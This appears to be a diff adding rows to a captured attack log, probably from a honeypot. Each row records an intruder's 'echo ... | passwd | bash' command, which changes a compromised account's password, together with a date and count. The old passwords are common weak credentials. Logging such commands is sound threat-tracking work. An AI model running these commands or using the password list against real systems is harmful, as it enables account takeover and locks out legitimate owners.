+"echo -e ""123\nlDcsdLof1Oeo\nlDcsdLof1Oeo""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""123\nmYK95rQ14vni\nmYK95rQ14vni""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""123\nml88Ow5blJRt\nml88Ow5blJRt""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""123\no4UqCMZPcfU3\no4UqCMZPcfU3""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""123\noL3680V15XVx\noL3680V15XVx""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""123\noiOxSzvnhuAr\noiOxSzvnhuAr""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""123\npdY4d32cPnqZ\npdY4d32cPnqZ""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""123\nraLgW5DCcxDy\nraLgW5DCcxDy""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""123\nruSZOQY4r7Za\nruSZOQY4r7Za""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""123\ns5w4Oy1EiXUd\ns5w4Oy1EiXUd""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""123\nxhdgKn20A1eQ\nxhdgKn20A1eQ""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""123\nyJXtGosGf9uR\nyJXtGosGf9uR""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""123\nz43D0cPsV4Pm\nz43D0cPsV4Pm""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""124578\nOSOPL18M8nIY\nOSOPL18M8nIY""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""124578\nqitObwFk7zyq\nqitObwFk7zyq""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""159357\nNld5duCUN28w\nNld5duCUN28w""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""1\n3R9XTOBYYcSH\n3R9XTOBYYcSH""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""1\n52v2J59oJMdT\n52v2J59oJMdT""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""1\n9lESb8HZ2PO5\n9lESb8HZ2PO5""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""1\n9tn0NCM2E29j\n9tn0NCM2E29j""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""1\nHdyJAAOG7cx0\nHdyJAAOG7cx0""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""1\nIDvhmkvHcz27\nIDvhmkvHcz27""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""1\nQuNy1SjNUR2A\nQuNy1SjNUR2A""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""1\nSmtlXpBrRvUe\nSmtlXpBrRvUe""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""1\nYXaGARJ16bRZ\nYXaGARJ16bRZ""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""1\nZktxovH1RZUj\nZktxovH1RZUj""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""1\ncP438zFL5Yu5\ncP438zFL5Yu5""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""1\nhwMH8qIQ1RNW\nhwMH8qIQ1RNW""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""1\nkJz67vRX7d4B\nkJz67vRX7d4B""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""1q2w3e4r\nZJdf3LeB3tJQ\nZJdf3LeB3tJQ""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""1qaz!QAZ\np2fOvXkioYJy\np2fOvXkioYJy""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""1qaz@WSX3edc\nB8PrMV3nappj\nB8PrMV3nappj""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""1qaz@WSX3edc\ngvQs8v6ptckh\ngvQs8v6ptckh""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""1qaz@wsx\n0BSiZf9GAN25\n0BSiZf9GAN25""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""1qaz@wsx\nUWpQYqvLK2iY\nUWpQYqvLK2iY""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""1qaz@wsx\ncRPkbusJsYIt\ncRPkbusJsYIt""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""1qaz@wsx\nsXiQEiP8aCiS\nsXiQEiP8aCiS""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""24online\nuL7cU7DCwGTm\nuL7cU7DCwGTm""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""54321\n1iBdkqK51qBV\n1iBdkqK51qBV""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""54321\nN1rvihz5zmM7\nN1rvihz5zmM7""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""999999999\n9HVFaIVFfGNP\n9HVFaIVFfGNP""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""Abc12345678!\nEfoF7PslafrB\nEfoF7PslafrB""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""Abc12345678!\nd52OQfGZ8I7x\nd52OQfGZ8I7x""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""Abc12345678!\neCrwtBHZE3Vt\neCrwtBHZE3Vt""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""Admin@123\neDcYtiLDu3Ws\neDcYtiLDu3Ws""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""Admin@123\nqQKTkXb4U6CU\nqQKTkXb4U6CU""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""Administrator123\n5vHiwOJ3ALOq\n5vHiwOJ3ALOq""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""Administrator123\nCviafPthHTka\nCviafPthHTka""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""Administrator123\neDco6dHfNRw4\neDco6dHfNRw4""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""Administrator123\nmc7vsqt9wXDT\nmc7vsqt9wXDT""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""E1ementa!5\nYCudg21jszRd\nYCudg21jszRd""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""E1ementa!5\nZjPFXfF0nw87\nZjPFXfF0nw87""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""E1ementa!5\nh8FamUdjrd7v\nh8FamUdjrd7v""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""Huawei12#$\nKTilPMnteFsq\nKTilPMnteFsq""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""Huawei12#$\nPv7BOSMuB0TZ\nPv7BOSMuB0TZ""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""Huawei12#$\nRtWkd3zcCj46\nRtWkd3zcCj46""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""Huawei12#$\noaRBCgU5GoTK\noaRBCgU5GoTK""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""Huawei12#$\nsPehwLp1rx49\nsPehwLp1rx49""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""Huawei12#$\nwUS1usYFco4Y\nwUS1usYFco4Y""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""Itsemoemo2025@Washere2025\n6yC5RZsedQZF\n6yC5RZsedQZF""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""Itsemoemo2025@Washere2025\nLDt9u2ANiNix\nLDt9u2ANiNix""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""Itsemoemo2025@Washere2025\ndPTm0Lg1bnWI\ndPTm0Lg1bnWI""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""Itsemoemo2025@Washere2025\nwsb9mIKd83yF\nwsb9mIKd83yF""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""ORACLE\nPM5pVNhoHnOA\nPM5pVNhoHnOA""|passwd|bash",16/11/2025 00:00,1
+"echo -e ""P@ssw0rd!\nEPOxa6RiqNC6\nEPOxa6RiqNC6""|passwd|bash",16/11/2025 00:00,1
+"echo -e ""P@ssw0rd\n4X1CI4Amnu4M\n4X1CI4Amnu4M""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""P@ssw0rd\nU1O8ew67XXgq\nU1O8ew67XXgq""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""P@ssw0rd\nUsYbc1YEWgTm\nUsYbc1YEWgTm""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""P@ssw0rd\nYPbz7RCdEw8w\nYPbz7RCdEw8w""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""P@ssw0rd\nrebktJ63k8BZ\nrebktJ63k8BZ""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""Pa$$w0rd\nJxJmukyzEHHS\nJxJmukyzEHHS""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""Pa$$w0rd\nhZSblMnUpt6A\nhZSblMnUpt6A""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""Pa$$w0rd\nugOMq4XJw5pe\nugOMq4XJw5pe""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""Password!\nfbgbZebPiGB2\nfbgbZebPiGB2""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""Password123!\nDRQfIlVxNcgw\nDRQfIlVxNcgw""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""Password123!\nHjcSeZNnt8ky\nHjcSeZNnt8ky""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""Password123!\nJ9Ft9BpdVZ8I\nJ9Ft9BpdVZ8I""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""Password123!\nKHarq3KBGZnG\nKHarq3KBGZnG""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""Password123!\nPHnN0OJGrQcZ\nPHnN0OJGrQcZ""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""Password123!\nhR9KDYlFWtu0\nhR9KDYlFWtu0""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""Password123!\niFixZB2vkNHP\niFixZB2vkNHP""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""Password123!\nryIm2e7qHU8X\nryIm2e7qHU8X""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""Password123!\nuBHVVfpaYkNf\nuBHVVfpaYkNf""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""Password1\n1YiUOTEkthan\n1YiUOTEkthan""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""Password1\nEr1QmynvzY0d\nEr1QmynvzY0d""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""QWEasd123!\n4S6WPeeW7a1S\n4S6WPeeW7a1S""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""QWEasd123!\nYQN3YNHGXf4t\nYQN3YNHGXf4t""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""QWEasd123!\nza2F4lBCVrLp\nza2F4lBCVrLp""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""Qwer1234@\n9S7LJjL9mQrs\n9S7LJjL9mQrs""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""Qwer1234@\nRsx7HXVFRsWm\nRsx7HXVFRsWm""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""Qwer1234@\nhTHNwEUBOfTZ\nhTHNwEUBOfTZ""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""Qwer1234@\npNHxxcXo1tGO\npNHxxcXo1tGO""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""Qwer1234@\nsQjllMhpHRHg\nsQjllMhpHRHg""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""Welcome1\n3MhhGQdKrkIe\n3MhhGQdKrkIe""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""a123\nmQ3oEb0c7K5l\nmQ3oEb0c7K5l""|passwd|bash",29/11/2025 00:00,1
+"echo -e ""aa@123\nOA3ppYq7kgzv\nOA3ppYq7kgzv""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""aa@123\nwos5kdj0gZyw\nwos5kdj0gZyw""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""abc12345\ncx7boTqRUqCq\ncx7boTqRUqCq""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""adam@123\n8hwcwfYsaJFy\n8hwcwfYsaJFy""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""adam@123\nO7sU7H3nId5i\nO7sU7H3nId5i""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""adam@123\nQxjh4u9p6SfU\nQxjh4u9p6SfU""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""adm\n8bSjqHDoePCv\n8bSjqHDoePCv""|passwd|bash",29/11/2025 00:00,1
+"echo -e ""adm\nY4v9cZXD9onC\nY4v9cZXD9onC""|passwd|bash",29/11/2025 00:00,1
+"echo -e ""admin123456789\nz1dpQtaqKc6y\nz1dpQtaqKc6y""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""admin1234\ndKbZCh2TAnju\ndKbZCh2TAnju""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""admin123@123\nFW16rhSVOH20\nFW16rhSVOH20""|passwd|bash",29/11/2025 00:00,1
+"echo -e ""admin123\nFI3OJSVrLGPA\nFI3OJSVrLGPA""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""admin123\nJXrJeXkGgX2O\nJXrJeXkGgX2O""|passwd|bash",24/11/2025 00:00,1
+"echo -e ""admin123\nZLyU8Iycy0QK\nZLyU8Iycy0QK""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""admin2024\nUOXh67PCK6nh\nUOXh67PCK6nh""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""administrator@123\nAa4AcIoaI5wT\nAa4AcIoaI5wT""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""administrator@123\nuuB78TIfSkLM\nuuB78TIfSkLM""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""ahmed\nPckOfLwYHMfp\nPckOfLwYHMfp""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""ahmed\nS6I7j0I5K5f0\nS6I7j0I5K5f0""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""ali@123\nDqSkiWU3m3w2\nDqSkiWU3m3w2""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""angel\n4uuRS1GmFAsK\n4uuRS1GmFAsK""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""ansadmin\nelJJL8ve1rFZ\nelJJL8ve1rFZ""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""ansible2025\nepW3RXKoS6LA\nepW3RXKoS6LA""|passwd|bash",18/11/2025 00:00,1
+"echo -e ""anu\nkuiYEX7BBAYa\nkuiYEX7BBAYa""|passwd|bash",19/11/2025 12:00,1
+"echo -e ""ark@123\nLdNvF4SwOKGh\nLdNvF4SwOKGh""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""autcom@123\n1eGFtflUnJDn\n1eGFtflUnJDn""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""backend123\nGzK9YE0Q1QyP\nGzK9YE0Q1QyP""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""bot@123\nfOxNrbRjN4t4\nfOxNrbRjN4t4""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""builder123\n203RJOqIw7Kj\n203RJOqIw7Kj""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""builder123\nQvKRNk8loCJW\nQvKRNk8loCJW""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""builder123\noOEPDiSWDfME\noOEPDiSWDfME""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""builder123\nz56roQCNmEy1\nz56roQCNmEy1""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""castle@123\nBXmGtIZhsg75\nBXmGtIZhsg75""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""castle@123\nSPLdAFJC3Iyc\nSPLdAFJC3Iyc""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""cc123\nwhmlaTjFwKWI\nwhmlaTjFwKWI""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""cds123\nI5Nu8uU75ANf\nI5Nu8uU75ANf""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""cds123\nrvserNwQadK4\nrvserNwQadK4""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""cds@123\nLqTKCP6P5gkx\nLqTKCP6P5gkx""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""cds@123\nepaionzwkTzc\nepaionzwkTzc""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""cds@123\ng00YwtEMqNku\ng00YwtEMqNku""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""celeryuser\n1nWsEDEmjVRN\n1nWsEDEmjVRN""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""celeryuser\nZZQZmlQcsLNw\nZZQZmlQcsLNw""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""celeryuser\nx2AmJWz8kCye\nx2AmJWz8kCye""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""coder\n0xrcuG4ef8SH\n0xrcuG4ef8SH""|passwd|bash",19/11/2025 12:00,1
+"echo -e ""coder\nM2erqxFD3t2u\nM2erqxFD3t2u""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""compta\ngGLs0DkievkX\ngGLs0DkievkX""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""confluence\nuORHfbQl1CHI\nuORHfbQl1CHI""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""copia123\n0InpIGCNGC5g\n0InpIGCNGC5g""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""damian123\nELBCQ1xWugWG\nELBCQ1xWugWG""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""damian123\nFs8e8ckhn2CP\nFs8e8ckhn2CP""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""damian\nmELDS7759nJ4\nmELDS7759nJ4""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""db\nYq7ZhBu20Kf1\nYq7ZhBu20Kf1""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""dd\nFqMyhqoWXugI\nFqMyhqoWXugI""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""dd\nICp5vuE57aeS\nICp5vuE57aeS""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""dd\neHzU4RLWUxaL\neHzU4RLWUxaL""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""deamon123\nDjzXC867AEpr\nDjzXC867AEpr""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""deamon@123\nBizPixdLfiJe\nBizPixdLfiJe""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""deamon@123\nvQBlYj1TVYFK\nvQBlYj1TVYFK""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""debian10svm\nVUapOLen5iYj\nVUapOLen5iYj""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""deploy@\nc65DEnSS60Js\nc65DEnSS60Js""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""deploy@\niQeZSieSKEos\niQeZSieSKEos""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""dev\nTqEYvR6gaQLC\nTqEYvR6gaQLC""|passwd|bash",20/11/2025 12:00,1
+"echo -e ""developer\niWlBmTi4VWeu\niWlBmTi4VWeu""|passwd|bash",29/11/2025 00:00,1
+"echo -e ""developer\nq9LqQ7DErm35\nq9LqQ7DErm35""|passwd|bash",29/11/2025 00:00,1
+"echo -e ""dq\nWxhfPOMH08s5\nWxhfPOMH08s5""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""dq\ns8v6bVaJZTHB\ns8v6bVaJZTHB""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""dragon\n5Bz2dUWbNfi9\n5Bz2dUWbNfi9""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""dragon\no24tYWXqstSL\no24tYWXqstSL""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""dragon\nyrPUAZvMvBA3\nyrPUAZvMvBA3""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""elastic\nTAdCJ3SxVNtv\nTAdCJ3SxVNtv""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""elastic\nijXjFRHzxv1a\nijXjFRHzxv1a""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""elastic\nrfBeK7Zgg99A\nrfBeK7Zgg99A""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""elastic\nu8nhSN78TxPY\nu8nhSN78TxPY""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""elastic\nuVd3fCDPX8Ld\nuVd3fCDPX8Ld""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""elasticsearch\nHF4LLhdyTv5X\nHF4LLhdyTv5X""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""elemental123\nshINR0zh3Zu4\nshINR0zh3Zu4""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""eloa\nWSPUFWluF26K\nWSPUFWluF26K""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""eloa\npAEqWPwoBwmF\npAEqWPwoBwmF""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""emily\n0gTFnv3gfleJ\n0gTFnv3gfleJ""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""emily\nI4E4k9UTO8Pz\nI4E4k9UTO8Pz""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""emily\nVhGiLK4bwupn\nVhGiLK4bwupn""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""eren@123\n2yEkm7ZKhU3e\n2yEkm7ZKhU3e""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""eren@123\nCHWCv78lQYe3\nCHWCv78lQYe3""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""exx123\nYRibZgsllpFK\nYRibZgsllpFK""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""exx123\njuUpweryrx6X\njuUpweryrx6X""|passwd|bash",28/11/2025 12:00,1
+"echo -e ""fan\n1Kj5y7E8hor2\n1Kj5y7E8hor2""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""fan\nFgKigUYqyAEm\nFgKigUYqyAEm""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""fan\nVIg2j5Uw0OB7\nVIg2j5Uw0OB7""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""fan\nWh45oNlK9aFb\nWh45oNlK9aFb""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""fan\nazjRjBH82don\nazjRjBH82don""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""fan\nggUfH7Dt0DCg\nggUfH7Dt0DCg""|passwd|bash",29/11/2025 12:00,1
+"echo -e ""francesco\nEuFUQvpMF2QN\nEuFUQvpMF2QN""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""frappe\nSLTxldieEn4L\nSLTxldieEn4L""|passwd|bash",30/11/2025 00:00,1
+"echo -e ""free\nNfJ9LDlcaRkn\nNfJ9LDlcaRkn""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""free\nWV0odvQr4LIg\nWV0odvQr4LIg""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""frontend123\nhKxX4z1AaKxQ\nhKxX4z1AaKxQ""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""frontend123\nrruhygI5yfQD\nrruhygI5yfQD""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""ftpftp\n37zFqYup579D\n37zFqYup579D""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""ftpftp\n3IxD7tGn9tYP\n3IxD7tGn9tYP""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""ftpftp\n90AUNZHXxgNM\n90AUNZHXxgNM""|passwd|bash",22/11/2025 12:00,1
+"echo -e ""ftpftp\nC1LLYN7GJPhE\nC1LLYN7GJPhE""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""ftpftp\nETMuIgvYnSJ9\nETMuIgvYnSJ9""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""ftpftp\nKZEgug5oPK1v\nKZEgug5oPK1v""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""ftpftp\nLrVziApA6wFE\nLrVziApA6wFE""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""ftpftp\nPe1bZmsDk1eJ\nPe1bZmsDk1eJ""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""ftpftp\nYykw0WEXEPgS\nYykw0WEXEPgS""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""ftpftp\ncCddjSiJkR4g\ncCddjSiJkR4g""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""ftpftp\nj2punRbT8AhP\nj2punRbT8AhP""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""ftpftp\nl7H2P77tAXsZ\nl7H2P77tAXsZ""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""ftpftp\nt9ENITcEGoxl\nt9ENITcEGoxl""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""ftpftp\nthmLNNghPAwk\nthmLNNghPAwk""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""ftpftp\nxLVF3py1yHnF\nxLVF3py1yHnF""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""ftpftp\nzpvxb0N5T3Rn\nzpvxb0N5T3Rn""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""ftpftp\nzwUMLhfLFgVa\nzwUMLhfLFgVa""|passwd|bash",23/11/2025 00:00,1
+"echo -e ""ftpuser01\nsrPkfLCfF1RZ\nsrPkfLCfF1RZ""|passwd|bash",19/11/2025 12:00,1
+"echo -e ""ftpuser@2024\n6XHzUcO5iFLC\n6XHzUcO5iFLC""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""ftpuser@2024\nL0FiRww4VmkF\nL0FiRww4VmkF""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""ftpuser@2024\nuo1dljjiDdjx\nuo1dljjiDdjx""|passwd|bash",15/11/2025 12:00,1
+"echo -e ""ftpuser\nzvKXEoq1KU9g\nzvKXEoq1KU9g""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""gcs@123\nUrh3hMtwM2mQ\nUrh3hMtwM2mQ""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""gerald\nY35XagYilVDU\nY35XagYilVDU""|passwd|bash",21/11/2025 00:00,1
+"echo -e ""gfhjkm\nuRKTqUZqFNK7\nuRKTqUZqFNK7""|passwd|bash",15/11/2025 00:00,1
+"echo -e ""gitea123\n9oAetT7ZOnut\n9oAetT7ZOnut""|passwd|bash",26/11/2025 00:00,1
+"echo -e ""glassfish\n955VHxBT1uR7\n955VHxBT1uR7""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""glassfish\nlaFSF0YZBlj1\nlaFSF0YZBlj1""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""glassfish\nsBgROrNT089p\nsBgROrNT089p""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""glassfish\nwZIJxowWug6V\nwZIJxowWug6V""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""glenn@123\nAPTzhniMKbP0\nAPTzhniMKbP0""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""glenn@123\nI9siDbCARcAi\nI9siDbCARcAi""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""glenn@123\nVZ0TXEpJvNvN\nVZ0TXEpJvNvN""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""glenn@123\nbFi8wzRoinSu\nbFi8wzRoinSu""|passwd|bash",27/11/2025 00:00,1
+"echo -e ""gnssr\nGtEbOmBetMwp\nGtEbOmBetMwp""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""gnssr\nLF5qpBE4GJEI\nLF5qpBE4GJEI""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""gnssr\ndgeqpECdiKdY\ndgeqpECdiKdY""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""guest!@#\n2XsI4lxpjWqM\n2XsI4lxpjWqM""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""guest!@#\nd44D1QSsQOPI\nd44D1QSsQOPI""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""hadoop\ncFBqE58Aoz7B\ncFBqE58Aoz7B""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""hadoop\nfBU6n0KgR8RZ\nfBU6n0KgR8RZ""|passwd|bash",25/11/2025 00:00,1
+"echo -e ""hb@2025\nPHVf6mgrrPsu\nPHVf6mgrrPsu""|passwd|bash",21/11/2025 12:00,1
+"echo -e ""heni\n5c6yvREXRjm0\n5c6yvREXRjm0""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""heni\nPwb4Zm92END9\nPwb4Zm92END9""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""heni\nbufi9aFF8A1s\nbufi9aFF8A1s""|passwd|bash",19/11/2025 00:00,1
+"echo -e ""ho\nHmNDlMkHsIho\nHmNDlMkHsIho""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""hola\ni8dgzyiUGNk1\ni8dgzyiUGNk1""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""hola\nmQR2cda6veU2\nmQR2cda6veU2""|passwd|bash",17/11/2025 12:00,1
+"echo -e ""huawei123\nFIPSGEJ0DCCC\nFIPSGEJ0DCCC""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""huawei123\nmiIARhbS3UT0\nmiIARhbS3UT0""|passwd|bash",25/11/2025 12:00,1
+"echo -e ""hung123\nDv73u67Utu9b\nDv73u67Utu9b""|passwd|bash",22/11/2025 00:00,1
+"echo -e ""id\n2jend9M7CgK2\n2jend9M7CgK2""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""id\nrpn8LCadBuHr\nrpn8LCadBuHr""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""idbteam\nCo9DikgZYn5q\nCo9DikgZYn5q""|passwd|bash",20/11/2025 00:00,1
+"echo -e ""idbteam\nMzPcvkfVWd13\nMzPcvkfVWd13""|passwd|bash",20/11/2025 00:00,1
